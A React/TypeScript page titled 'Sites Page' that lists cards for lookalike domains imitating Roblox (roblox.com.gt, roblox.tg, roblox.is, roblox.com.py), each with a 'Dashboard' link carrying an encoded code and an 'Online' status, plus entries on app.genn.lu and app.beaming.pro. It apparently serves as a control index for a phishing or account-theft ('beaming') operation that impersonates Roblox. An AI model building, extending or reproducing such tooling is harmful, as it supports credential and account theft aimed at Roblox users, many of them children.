
import { useEffect, useState } from "react";

const cardData = [
  { title: "roblox.com.gt", url: "https://roblox.com.gt/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==", status: "Online", flag: "💬 💮" },
  { title: "roblox.tg", url: "https://roblox.tg/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==", status: "Online", flag: "💬 💮" },
  { title: "roblox.is", url: "https://roblox.is/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==", status: "Online", flag: "💬 💮" },
  { title: "roblox.py", url: "https://roblox.com.py/dashboard/?code=NjM1MzAyODE3NTY8NTA5NzkyNg==", status: "Online", flag: "💬 💮" },
  { title: "App.genn.lu", url: "https://app.genn.lu/auth/mainslte", status: "Online", flag: "None", isMore: true },
  { title: "App.beaming.pro", url: "https://app.beaming.pro/u/SpIank", status: "Online", flag: "None", isMore: true },
];

const Card = ({ title, url, status, flag, index }: { title: string; url: string; status: string; flag: string; index: number }) => {
  const handleClick = () => alert(title);

  return (
    <div
      className="bg-white bg-opacity-10 backdrop-blur-lg rounded-2xl p-6 border border-[#e0e0ff] border-opacity-30 shadow-[0_0_10px_rgba(255,255,255,0.3)] hover:shadow-[0_0_20px_rgba(255,255,255,0.5)] hover:-translate-y-2 hover:scale-105 transition-all duration-300 cursor-pointer animate-fadeIn"
      style={{ animationDelay: `${index * 0.1}s` }}
      onClick={handleClick}
    >
      <h2 className="text-2xl font-semibold text-[#e0e0ff]">{title}</h2>
      <p className="text-[#28c46b] bg-[#28c46b] bg-opacity-20 px-2 py-1 rounded mt-2 inline-block">{status}</p>
      <p className="text-[#e0e0ff] mt-2">{flag}</p>
      <a
        href={url}
        target="_blank"
        rel="noopener noreferrer"
        className="text-[#5d9bff] hover:underline mt-4 block"
        onClick={(e) => e.stopPropagation()}
      >
        Dashboard
      </a>
    </div>
  );
};

export default function Home() {
  return (
    <div className="min-h-screen bg-gradient-to-br from-[#0f0c29] via-[#302b63] to-[#24243e] p-8">
      <header className="text-center mb-12 animate-fadeIn">
        <h1 className="text-4xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-[#a7a3ff] to-[#5d9bff]">
          Sites Page
        </h1>
        <p className="text-[#e0e0ff] mt-2 text-lg">Use this page to view all of our 'Roblox' links</p>
      </header>
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
        {cardData.map((card, index) => (
          <Card key={index} {...card} index={index} />
        ))}
      </div>
    </div>
  );
}
```
